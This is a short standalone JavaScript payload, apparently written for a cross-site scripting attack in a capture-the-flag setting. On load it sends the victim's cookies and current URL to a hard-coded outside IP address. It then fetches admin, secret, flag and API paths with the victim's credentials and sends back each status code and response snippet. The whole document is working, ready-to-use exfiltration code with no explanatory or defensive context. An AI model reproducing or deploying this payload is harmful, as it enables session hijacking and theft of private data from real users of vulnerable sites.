(() => {
  const exfil = "http://45.82.82.114:8081/sq";

  function send(k, v) {
    const i = new Image();
    i.src = `${exfil}?k=${encodeURIComponent(k)}&v=${encodeURIComponent(v)}&t=${Date.now()}`;
  }

  send("cookie", document.cookie || "(empty)");
  send("href", location.href);

  const paths = [
    "/",
    "/index.php",
    "/admin",
    "/admin.php",
    "/admin/dashboard.php",
    "/dashboard.php",
    "/flag",
    "/flag.txt",
    "/secret",
    "/secret.php",
    "/api/me",
    "/api/admin",
  ];

  let delay = 0;
  paths.forEach((p) => {
    setTimeout(() => {
      fetch(p, { credentials: "include" })
        .then((r) => r.text().then((t) => ({ status: r.status, body: t })))
        .then(({ status, body }) => {
          const snippet = body.replace(/\s+/g, " ").slice(0, 220);
          send(`path:${p}`, `status=${status}; body=${snippet}`);
        })
        .catch((e) => send(`path:${p}`, `err=${String(e)}`));
    }, delay);
    delay += 300;
  });
})();
